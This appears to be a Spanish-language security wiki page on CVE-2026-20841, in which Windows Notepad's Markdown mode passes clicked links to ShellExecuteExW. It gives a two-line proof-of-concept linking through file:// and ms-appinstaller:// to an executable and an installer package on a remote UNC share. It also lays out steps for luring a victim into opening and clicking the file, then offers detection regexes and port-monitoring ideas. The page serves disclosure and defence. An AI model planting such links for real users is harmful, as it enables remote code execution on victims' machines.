# Windows Protocol Handler / ShellExecute Abuse (Renderizadores Markdown)

{{#include ../banners/hacktricks-training.md}}

Las aplicaciones modernas de Windows que renderizan Markdown/HTML suelen convertir los links proporcionados por el usuario en elementos en los que se puede hacer clic y pasarlos a `ShellExecuteExW`. Sin una allowlist estricta de schemes, cualquier protocol handler registrado (por ejemplo, `file:`, `ms-appinstaller:`) puede activarse, lo que puede provocar code execution en el contexto del usuario actual.<sup>[[1]](#references)</sup>

## Superficie de ShellExecuteExW en el modo Markdown de Windows Notepad
- Notepad selecciona el modo Markdown **solo para extensiones `.md`** mediante una comparación de strings fija en `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Links Markdown compatibles:
- Estándar: `[text](target)`
- Autolink: `<target>` (renderizado como `[target](target)`), por lo que ambas sintaxis son relevantes para los payloads y las detecciones.
- Los clics en los links se procesan en `sub_140170F60()`, que realiza un filtrado débil y después llama a `ShellExecuteExW`.
- `ShellExecuteExW` realiza dispatch a **cualquier protocol handler configurado**, no solo HTTP(S).<sup>[[1]](#references)</sup>

### Consideraciones sobre el payload
- Cualquier secuencia `\\` en el link se **normaliza a `\`** antes de `ShellExecuteExW`, lo que afecta a la creación de UNC/paths y a la detección.
- Los archivos `.md` **no están asociados con Notepad de forma predeterminada**; la víctima aún debe abrir el archivo en Notepad y hacer clic en el link, pero una vez renderizado, se puede hacer clic en el link.
- Schemes peligrosos de ejemplo:<sup>[[1]](#references)</sup>
- `file://` para lanzar un payload local/UNC.
- `ms-appinstaller://` para activar flujos de App Installer. Otros schemes registrados localmente también pueden ser abusables.

### Markdown PoC mínimo
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flujo de explotación
1. Crea un **archivo `.md`** para que Notepad lo renderice como Markdown.
2. Inserta un enlace usando un esquema URI peligroso (`file:`, `ms-appinstaller:` o cualquier handler instalado).
3. Entrega el archivo (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o similar) y convence al usuario de abrirlo en Notepad.
4. Al hacer clic, el **enlace normalizado** se entrega a `ShellExecuteExW` y el handler de protocolo correspondiente ejecuta el contenido referenciado en el contexto del usuario.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideas de detección
- Monitoriza las transferencias de archivos `.md` a través de puertos/protocolos que suelen entregar documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analiza los enlaces Markdown (estándar y autolink) y busca `file:` o `ms-appinstaller:` **sin distinguir mayúsculas de minúsculas**.
- Regex guiadas por el proveedor para detectar el acceso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Según se informa, el comportamiento del **patch** incluye una **allowlist** de archivos locales y HTTP(S); cualquier otra cosa que llegue a `ShellExecuteExW` es sospechosa. Amplía las detecciones a otros protocol handlers instalados según sea necesario, ya que la attack surface varía según el sistema.<sup>[[1]](#references)</sup>

## Referencias
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
